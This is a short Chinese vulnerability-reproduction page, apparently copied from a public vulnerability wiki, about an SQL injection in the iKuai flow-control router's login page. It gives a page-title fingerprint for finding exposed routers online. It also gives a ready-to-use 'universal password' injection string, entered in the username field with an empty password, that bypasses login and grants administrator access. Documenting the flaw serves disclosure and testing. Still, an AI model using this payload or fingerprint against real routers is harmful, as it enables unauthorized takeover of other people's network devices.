---
title: "iKuai 流控路由 SQL注入漏洞"
date: 2026-10-18 09:15:33
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "iKuai-流控路由"
tags:
  - "iKuai-流控路由"
  - "SQL注入"
  - "漏洞复现"
---
## 漏洞描述

iKuai 流控路由 存在SQL注入漏洞，可以通过SQL注入漏洞构造万能密码获取路由器后台管理权限

## 漏洞影响

```
iKuai 流控路由
```

## 网络测绘

```
title="登录爱快流控路由"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202140931704.png)

使用万能密码登录后台

```plain
user: "or""=""or""="
pass: 空
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202140931830.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/iKuai-%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
